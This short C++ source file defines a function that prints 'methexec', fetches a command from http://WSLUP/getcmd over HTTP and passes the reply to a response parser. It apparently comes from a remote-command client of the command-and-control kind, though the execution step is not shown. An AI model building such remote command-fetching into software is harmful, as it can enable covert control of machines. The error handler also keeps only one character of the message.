//
// Created by nicla on 20.10.2022.
//
#include <iostream>
#include "SendRequest.h"
#include "HTTPRequest.hpp"
#include "ResponseParser.h"
string SendRequesth::SendCommandRequest() {
    string output;
    cout<< "methexec"<<endl;
    try
    {
        http::Request request{"http://WSLUP/getcmd"};
        const auto response = request.send("GET");
        output = {response.body.begin(), response.body.end()};
    }
    catch (const std::exception& e)
    {
        output += *e.what();
    }
    return ResponseParser::InputString(output);
}